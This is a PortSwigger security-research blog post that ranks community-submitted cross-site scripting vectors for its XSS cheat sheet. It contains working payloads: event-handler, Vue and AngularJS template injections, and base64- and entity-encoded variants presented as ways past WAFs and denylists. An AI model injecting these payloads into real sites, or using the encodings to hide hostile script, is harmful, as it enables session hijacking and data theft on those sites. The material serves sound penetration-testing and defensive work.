# Our favourite community contributions to the XSS cheat sheet

Source: https://portswigger.net/research/our-favourite-community-contributions-to-the-xss-cheat-sheet
Fetched: 2026-06-28T09:17:27.962193+00:00

Our favourite community contributions to the XSS cheat sheet

Gareth Heyes

Researcher

@garethheyes

Published: Monday, 3 October 2022 at 14:28 UTC

Updated: Thursday, 20 October 2022 at 08:28 UTC

Since we launched the ever popular XSS cheat sheet, we've had some fantastic contributions from the XSS community. In this post, we thought we'd take the opportunity to highlight the seven best community submissions that we think stand out from the rest.

Number 7: Missing events

At number seven is a whole range of missing events, submitted by @hahwul:

<div onpointerover="alert(45)">hahwul(45)</div>

<div onpointerdown="alert(45)">hahwul(45)</div>

<div onpointerenter="alert(45)">hahwul(45)</div>

<div onpointerleave="alert(45)">hahwul(45)</div>

<div onpointermove="alert(45)">hahwul(45)</div>

<div onpointerout="alert(45)">hahwul(45)</div>

<div onpointerup="alert(45)">hahwul(45)</div>

View this entry on the XSS cheat sheet

Number 6: Shorter Vue injection

In the sixth position is a Vue based vector entry, from @p4fg - this one uses the v-if attribute to save a few bytes:

<x v-if=_c.constructor('alert(1)')()>

View this entry on the XSS cheat sheet

Number 5: Tiny AngularJS vector

In at number five, this entry is a nice short vector from @NotSoSecure that may help when you have a character restriction limit with an AngularJS injection:

<input ng-cut=$event.path|orderBy:'(y=alert)(1)'>

View this entry on the XSS cheat sheet

Number 4: DOM based AngularJS vector

The entry at number four entry is a vector from @kachakil - they add a missing vector from our AngularJS research, and fix it so that it works in other contexts:

{y:''.constructor.prototype}.y.charAt=[].join;[1]|orderBy:'x=alert(1)'

View this entry on the XSS cheat sheet

Number 3: Unexpected Vue template injection

An unexpected entry at number three! We like this submission from @davwwwx because it injects into an HTML attribute that doesn't support Vue template expressions - it's very reminiscent of our AngularJS sandbox bypass.

<p slot-scope="){}}])+this.constructor.constructor('alert(1)')()})};//">

View this entry on the XSS cheat sheet

Number 2: Brand new onbeforeinput event

The penultimate entry is from @laytonctf, who spotted a new relatively unknown event onbeforeinput. Guaranteed to bypass a denylist - or "blacklist" - of known bad events, many WAFs block on* but for those who don't:

<input onbeforeinput=alert(1)>

View this entry on the XSS cheat sheet

Number 1: Base64 encoded javascript redirection

Claiming the top spot, and for good reason, we consider this the best entry that we wanted to highlight. It's from @ladecruze, and uses the location object, base64 decoding, and tagged template strings to execute the payload. It's a nice way to conceal a payload that should bypass a WAF that doesn't detect backticks:

<img src=x onerror=location=atob`amF2YXNjcmlwdDphbGVydChkb2N1bWVudC5kb21haW4p`>

If backticks are detected, then you could probably bypass a dumb WAF using the grave entity:

<img src=x onerror=location=atob&grave;amF2YXNjcmlwdDphbGVydChkb2N1bWVudC5kb21haW4p&grave;>

View this entry on the XSS cheat sheet

Mini challenge

We couldn't resist finding variants on @ladecruze's submission, using unescape/decodeURI/decodeURIComponent/String.fromCharCode/String.fromCodePoint. Can you find any more? Share them with us on @PortSwiggerRes if you do...

<img/src/onerror=location=unescape`%u006a%u0061%u0076%u0061%u0073%u0063%u0072%u0069%u0070%u0074%u003a%u0061%u006c%u0065%u0072%u0074%u0028%u0064%u006f%u0063%u0075%u006d%u0065%u006e%u0074%u002e%u0064%u006f%u006d%u0061%u0069%u006e%u0029`><img/src/onerror=location=String.fromCodePoint.call`${106}${97}${118}${97}${115}${99}${114}${105}${112}${116}${58}${97}${108}${101}${114}${116}${40}${49}${41}`>

Got a contribution of your own?

We hope you liked the submissions from the XSS community. If you think you've got a vector worthy of adding to the XSS cheat sheet, you can submit a pull request and if it's good enough, we'll add it with credit.

XSS

XSS cheat sheet

vectors

Back to all articles

Related Research

Cookie Chaos: How to bypass __Host and __Secure cookie prefixes

03 September 2025

Cookie Chaos: How to bypass __Host and __Secure cookie prefixes

Stealing HttpOnly cookies with the cookie sandwich technique

22 January 2025

Stealing HttpOnly cookies with the cookie sandwich technique

Bypassing WAFs with the phantom $Version cookie

04 December 2024

Bypassing WAFs with the phantom $Version cookie

Concealing payloads in URL credentials

23 October 2024

Concealing payloads in URL credentials
